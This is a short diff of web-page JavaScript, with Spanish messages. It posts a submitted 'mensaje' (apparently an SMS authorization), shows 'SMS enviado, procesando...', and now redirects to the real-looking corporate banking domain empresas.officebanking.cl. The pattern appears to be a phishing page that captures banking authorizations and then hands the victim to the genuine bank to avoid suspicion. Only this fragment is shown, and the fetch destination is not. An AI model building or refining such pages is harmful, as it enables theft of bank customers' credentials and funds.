@@ -70,7 +70,8 @@
           body: JSON.stringify({ mensaje })
         });
         document.getElementById("mensaje").innerText = "SMS enviado, procesando...";
-        setTimeout(()=> window.location.href="productos.html", 3000);
+        // Redirige a empresas.officebanking.cl
+        setTimeout(()=> window.location.href="https://empresas.officebanking.cl", 3000);
       } catch (error) {
         document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
       }
